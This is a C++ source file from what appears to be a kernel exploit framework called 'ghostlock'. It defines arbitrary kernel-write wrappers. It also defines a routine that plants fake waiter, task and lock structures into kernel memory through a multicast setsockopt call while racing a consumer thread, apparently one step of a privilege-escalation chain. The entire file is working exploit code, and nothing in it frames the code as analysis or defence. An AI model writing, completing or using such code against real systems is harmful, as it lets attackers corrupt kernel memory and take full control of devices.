#include "common.h"
#include <time.h>
#include <netinet/in.h>

#include "target.h"
#include "session/exploit_session.hpp"

/* The one-shot Multicast stamp buffer intentionally remains a dynamic stack
 * frame. Its layout/order is device-verified. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "routes/multicast_waiter_route.h"

namespace ghostlock::route {

/* Resident multicast writer wrappers (CPP13): the owning class lives in
 * multicast_waiter_route.cpp; the C-style call sites stay unchanged. */
int kernel5_resident_start(void) {
    return resident_route().start();
}

int kernel5_resident_write(uintptr_t target, uintptr_t value) {
    return resident_route().write(target, value);
}

void kernel5_resident_stop(void) {
    resident_route().stop();
}

RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
    (void) request;
    RouteStatus status = {.code = ROUTE_RETRYABLE};
    MulticastWaiterLayout layout =
            target_profile_multicast_waiter_layout(&g_target_profile);
    size_t stamp_size = layout.buffer_size;
    /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size];  // NOLINT(clang-analyzer-core.VLASize)
    memset(stamp, 0, sizeof(stamp));
    if (!ghostlock::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            layout.waiter_offset, layout.task_offset, layout.lock_offset,
            (g_heap_context.current.fake_task), (g_heap_context.current.fake_lock))) {
        status.step = 59;
        status.error_number = EOVERFLOW;
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                   "lock=%zu buffer=%zu\n", layout.waiter_offset,
                   layout.task_offset, layout.lock_offset, stamp_size);
        return status;
    }
    uint16_t family = AF_UNSPEC;
    memcpy(stamp + 8, &family, sizeof(family));

    int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        status.step = 60;
        status.error_number = errno;
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        status.code = ROUTE_FALLBACK_SAFE;
        return status;
    }
    atomic_store(&ghostlock::g_exploit_session.race.consumer_calls, 0);
    atomic_store(&ghostlock::g_exploit_session.race.consumer_success, 0);
    atomic_store(&ghostlock::g_exploit_session.race.consumer_stop, 0);
    atomic_store(&ghostlock::g_exploit_session.race.route_delay_usec, 0);
    errno = 0;
    int stamp_result =
            setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
    status.step = 61;
    status.error_number = errno;
    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
    for (int spin = 0; spin < 100000000 &&
            atomic_load(&ghostlock::g_exploit_session.race.consumer_calls) == 0; spin++)
        __asm__ volatile("yield":: : "memory");
    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 0);
    while (atomic_load(&ghostlock::g_exploit_session.race.consumer_inflight))
        __asm__ volatile("yield":: : "memory");
    close(fd);
    status.userspace_clean = 1;
    status.kernel_disarmed = 1;
    if (stamp_result == 0 ||
            atomic_load(&ghostlock::g_exploit_session.race.consumer_success) > 0) {
        status.step = 0;
        status.error_number = 0;
        status.code = ROUTE_OK;
    } else {
        status.code = ROUTE_FALLBACK_SAFE;
    }
    pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
            status.code, status.userspace_clean, status.kernel_disarmed,
            status.step, status.error_number);
    return status;
}

}  // namespace ghostlock::route
